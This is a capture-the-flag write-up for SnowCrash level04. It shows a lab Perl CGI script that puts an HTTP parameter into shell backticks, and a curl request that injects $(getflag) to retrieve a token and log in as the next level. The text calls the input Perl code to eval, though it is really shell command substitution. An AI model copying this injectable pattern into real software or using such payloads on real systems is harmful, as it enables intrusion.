# level04

HTTP post requests, and a vulnerable Perl CGI script

For this level, we are greeted with an odd Perl script
```bash
level04@SnowCrash:~$ ls
level04.pl
level04@SnowCrash:~$ cat level04.pl
```
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

After some crawling through Perl Common Gateway Interface docs and fiddling, all we have to do is make a POST request defining `x` as whatever Perl code we want to eval.
```bash
level04@SnowCrash:~$ curl 'http://localhost:4747?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$ su level05
Password: ne2searoevaevoem4ov4ar8ap
level05@SnowCrash:~$ 
```
